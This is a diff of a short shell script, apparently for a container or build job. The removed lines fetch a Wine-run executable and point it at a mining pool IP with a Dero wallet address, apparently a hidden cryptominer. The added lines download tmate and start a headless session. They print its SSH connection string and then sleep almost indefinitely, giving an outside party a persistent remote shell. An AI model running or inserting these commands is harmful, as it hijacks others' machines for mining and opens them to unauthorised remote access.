@@ -1,5 +1,12 @@
 apt-get update
-apt-get install -y --no-install-recommends wine-stable libwine wine64 xvfb gosu && dpkg --add-architecture i386 && apt-get update && apt-get install wine32 -y
-wget https://gitgud.io/trendava/ruby/-/raw/master/tini;chmod 700 tini
-wget https://gitgud.io/trendava/ruby/-/raw/master/luna.exe
-./tini -- xvfb-run -a wine ./luna.exe -d 213.171.208.37:10300 -w dero1qysflwnyf4mqhzdet7v478nn5l38q6u0uh9g86vtcpmrze0ml8xc7qgdhw9aj.JOSS
+apt-get install wget -y
+wget https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz
+tar xvf tmate-2.4.0-static-linux-amd64.tar.xz
+cd tmate-2.4.0-static-linux-amd64
+tmate -S /var/tmate.sock new-session -d               # Launch tmate in a headless mode
+tmate -S /var/tmate.sock wait tmate-ready             # Blocks until the SSH connection is established
+tmate -S /var/tmate.sock display -p '#{tmate_ssh}'
+tmate -S /var/tmate.sock new-session -d               # Launch tmate in a headless mode
+tmate -S /var/tmate.sock wait tmate-ready             # Blocks until the SSH connection is established
+tmate -S /var/tmate.sock display -p '#{tmate_ssh}'
+sleep 34823742
